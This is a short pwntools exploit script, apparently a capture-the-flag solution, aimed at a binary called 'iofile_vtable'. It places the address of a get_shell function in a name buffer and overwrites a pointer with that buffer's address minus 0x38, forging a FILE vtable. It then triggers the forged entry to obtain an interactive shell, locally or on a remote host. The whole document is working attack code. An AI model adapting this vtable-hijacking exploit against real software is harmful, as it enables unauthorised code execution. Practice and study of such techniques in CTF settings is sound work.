#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 0000
HOST = "host"
exe = context.binary = ELF('./iofile_vtable', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x0000000000400A26
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE
name = 0x00000000006010D0

# PAYLOAD
p.sendafter(b'name: ', flat(exe.sym.get_shell))
p.sendlineafter(b'> ', str(4))
p.sendafter(b'change: ', flat(name - 0x38))
GDB()
p.sendlineafter(b'> ', str(2))

p.interactive()